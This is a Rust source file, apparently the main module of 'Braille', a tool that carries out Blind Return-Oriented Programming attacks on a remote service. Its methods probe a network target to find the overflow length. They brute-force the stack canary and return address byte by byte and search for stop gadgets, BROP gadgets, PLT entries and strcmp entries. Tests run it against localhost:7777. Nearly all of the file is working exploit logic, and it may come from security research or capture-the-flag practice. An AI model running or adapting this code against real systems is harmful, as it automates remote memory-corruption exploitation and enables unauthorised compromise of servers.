use std::io;
use std::net::ToSocketAddrs;

use crate::{
    canary::Canary,
    cluster::{Byte, Cluster, Frame, Offset, Word, WordLike},
    gadget::{Gadget, Gadgets},
    overflow::Overflow,
    payload::Payload,
    plt::PLT,
    response::{Response, ReturnCode, ReturnVal},
    tube::Tube,
};

#[derive(Debug)]
pub struct Braille {
    tube: Tube,
    canary: Option<Canary>,
    overflow: Option<Overflow>,
    return_address: Option<Frame>,
    return_address_offset: Option<Offset>,
    padding: Option<Word>,
    stop_gadget: Option<Gadget>,
    plt: Option<PLT>,
    brop_gadgets: Option<Gadgets>,
    pub gadgets: Option<Gadgets>,
    pub strcmp_items: Option<Gadgets>,
}

pub const MAX_GADGET_SEARCHING_SIZE: u64 = 0x2800;

impl Braille {
    pub fn new(addr: impl ToSocketAddrs) -> Result<Braille, io::Error> {
        Ok(Braille {
            tube: Tube::new(addr)?,
            canary: None,
            overflow: None,
            return_address: None,
            return_address_offset: None,
            padding: None,
            stop_gadget: None,
            plt: None,
            brop_gadgets: None,
            gadgets: None,
            strcmp_items: None,
        })
    }

    pub fn get_overflow_length(&mut self) -> Option<Offset> {
        if self.overflow.is_none() {
            self.overflow = Some(Overflow::new(self));
        }
        self.overflow.as_ref()?.value()
    }

    pub fn get_canary_value(&mut self) -> Option<&Frame> {
        if self.canary.is_none() {
            self.canary = Canary::new(self);
        }
        self.canary.as_ref()?.value()
    }

    pub fn get_return_address_offset(&mut self) -> Option<Offset> {
        if self.return_address_offset.is_none() {
            self.return_address_offset = self.find_return_address_offset();
        }
        self.return_address_offset
    }

    pub fn get_possible_return_address(&mut self) -> Option<&Frame> {
        if self.return_address.is_none() {
            self.return_address = self.find_possible_return_address();
        }
        self.return_address.as_ref()
    }

    pub fn get_stop_gadget(&mut self) -> Option<&Gadget> {
        if self.stop_gadget.is_none() {
            self.stop_gadget = Gadget::find_stop_gadget(self);
        }
        self.stop_gadget.as_ref()
    }

    pub fn get_gadgets(&mut self) -> Option<&Gadgets> {
        if self.gadgets.is_none() {
            Gadget::find_gadgets(self);
        }
        self.gadgets.as_ref()
    }

    pub fn get_padding_value(&mut self) -> Option<&Word> {
        if self.padding.is_none() {
            self.padding = self.find_padding_value();
        }
        self.padding.as_ref()
    }

    pub fn get_plt(&mut self) -> Option<&PLT> {
        if self.plt.is_none() {
            self.plt = self.find_plt_items();
        }
        self.plt.as_ref()
    }

    pub fn get_plt_items(&mut self) -> Option<&Gadgets> {
        match self.get_plt() {
            Some(plt) => Some(plt.items()),
            None => None,
        }
    }

    pub fn get_brop_gadgets(&mut self) -> Option<&Gadgets> {
        if self.brop_gadgets.is_none() {
            self.brop_gadgets = Gadget::find_brop_gadgets(self);
        }
        self.brop_gadgets.as_ref()
    }

    pub fn get_strcmp_plt_items(&mut self) -> Option<&Gadgets> {
        if self.strcmp_items.is_none() {
            Gadget::find_strcmp_plt_items(self);
        }
        self.strcmp_items.as_ref()
    }
}

impl Braille {
    pub fn probe(&mut self, payload: &Payload) -> Option<ReturnCode> {
        self.tube.probe(payload)
    }

    pub fn has_canary(&mut self) -> bool {
        if self.canary.is_none() {
            self.canary = Canary::new(self);
        }
        if let Some(canary) = &self.canary {
            canary.exist()
        } else {
            false
        }
    }

    pub fn stack_read_byte(&mut self, payload: &Payload) -> Result<Byte, Option<Response>> {
        self.tube.stack_read_byte(payload)
    }

    pub fn stack_read_byte_start_from(
        &mut self,
        start: u8,
        payload: &Payload,
    ) -> Result<Byte, Option<Response>> {
        self.tube.stack_read_byte_start_from(start, payload)
    }

    pub fn stack_read_word(
        &mut self,
        payload: &Payload,
        len: usize,
    ) -> Result<Word, Option<Response>> {
        self.tube.stack_read_word(payload, len)
    }

    pub fn stack_read_frame(&mut self, payload: &Payload) -> Result<Frame, Option<Response>> {
        self.tube.stack_read_frame(payload)
    }

    fn find_padding_length(&mut self, payload: &Payload) -> Option<usize> {
        let mut padding_length = 8;
        let mut payload = payload.to_owned();
        loop {
            match self.stack_read_frame(&payload) {
                Ok(word) => {
                    padding_length += 8;
                    payload.append(Cluster::Frame(word));
                }
                Err(Some(Response {
                    value: ReturnVal::Word(word),
                    ..
                })) => {
                    self.stop_gadget = Some(Gadget(Frame::from_vec(word.to_vec())));
                    return Some(padding_length - 8);
                }
                _ => return None,
            }
        }
    }

    fn find_padding_value(&mut self) -> Option<Word> {
        let payload = Payload::through_canary(self)?;
        let padding_length = {
            let return_address_offset = self.get_return_address_offset()?;
            return_address_offset - payload.len()
        };
        if let Ok(word) = self.stack_read_word(&payload, padding_length) {
            Some(word)
        } else {
            None
        }
    }

    fn find_return_address_offset(&mut self) -> Option<Offset> {
        let overflow = self.get_overflow_length()?;
        let mut offset = overflow;
        if self.has_canary() {
            offset += 8;
        }
        let payload = Payload::through_canary(self)?;
        let padding_length = self.find_padding_length(&payload)?;
        Some(offset + padding_length)
    }

    fn find_possible_return_address(&mut self) -> Option<Frame> {
        let payload = Payload::till_return_address(self)?;
        let mut return_address = Vec::with_capacity(8);

        for _ in 1..=8 {
            let mut send = payload.to_owned();
            send.append(Cluster::Word(Word(return_address.to_owned())));
            let mut start = 0u8;
            loop {
                match self.stack_read_byte_start_from(start, &send) {
                    Ok(byte) => {
                        return_address.push(byte);
                        break;
                    }
                    Err(Some(Response {
                        code: ReturnCode::Infinite,
                        value: ReturnVal::Byte(byte),
                    })) => {
                        start = byte + 1;
                    }
                    _ => return None,
                }
            }
        }

        Some(Frame::from_vec(return_address))
    }

    fn find_plt_items(&mut self) -> Option<PLT> {
        if self.get_gadgets().is_some() {
            PLT::get(self)
        } else {
            None
        }
    }
}

#[cfg(test)]
mod tests {
    use super::Braille;

    #[test]
    fn test_braille_get_overflow_length() {
        let braille = Braille::new("localhost:7777");
        assert_eq!(42, braille.unwrap().get_overflow_length().unwrap());
    }

    #[test]
    fn test_braille_get_return_address_offset() {
        let braille = Braille::new("localhost:7777");
        assert_eq!(58, braille.unwrap().get_return_address_offset().unwrap());
    }
}
